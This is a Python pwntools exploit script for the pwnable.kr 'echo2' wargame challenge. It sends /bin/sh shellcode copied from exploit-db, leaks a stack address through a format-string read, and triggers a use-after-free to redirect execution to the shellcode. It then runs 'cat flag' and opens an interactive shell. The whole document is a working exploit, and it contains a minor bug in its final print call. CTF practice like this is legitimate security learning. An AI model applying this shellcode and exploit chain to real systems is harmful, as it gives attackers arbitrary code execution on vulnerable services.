from pwn import *

exe = ELF("./echo2_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path])
    else:
        r = remote("pwnable.kr", 9011)

    return r


def main():
    r = conn()

    # shellcode source : https://www.exploit-db.com/exploits/36858
    shellcode= '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
    r.sendlineafter(': ', shellcode)
    r.sendlineafter('> ', '2')
    r.recvline()
    r.sendline('%10$p')
    leaked_bp = int(r.recvline().strip(), 16)
    r.sendlineafter('> ', '4')
    r.sendlineafter('/n)', 'n')
    r.sendlineafter('> ', '3')

    sc_add = leaked_bp - 0x20
    payload = b'A' * 24 + p64(sc_add)

    r.recvline()
    r.sendline(payload)

    r.recv()
    r.sendline('cat flag')
    print(r.recvline)
    r.interactive()

if __name__ == "__main__":
    main()
